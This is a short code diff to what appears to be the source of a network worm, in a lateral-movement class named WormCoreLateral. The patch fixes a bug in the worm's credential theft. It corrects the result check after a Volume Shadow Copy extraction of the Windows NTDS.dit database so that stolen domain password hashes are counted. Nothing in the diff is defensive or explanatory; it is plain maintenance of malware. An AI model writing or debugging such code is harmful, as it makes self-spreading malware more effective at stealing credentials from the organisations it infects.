@@ -156,7 +156,10 @@ class WormCoreLateral:
                 if "windows" in os_guess:
                     logger.info(f"Extracting NTDS.dit via VSS on {source_ip}")
                     ntds_result = self.vss_ntds.run(volume="C:", cleanup=True)
-                    if ntds_result.get("ntds_dumped"):
+                    # VSSNTDSExtractor.run() returns {"success": ...}: the old
+                    # check for "ntds_dumped" (a key that does not exist) was
+                    # always False, so extracted hashes were never counted.
+                    if ntds_result.get("success") or ntds_result.get("ntds_dumped"):
                         logger.success(f"NTDS.dit extracted from {source_ip}")
                         self.stats["credentials_discovered"] += len(ntds_result.get("hashes", []))
             except Exception as e:
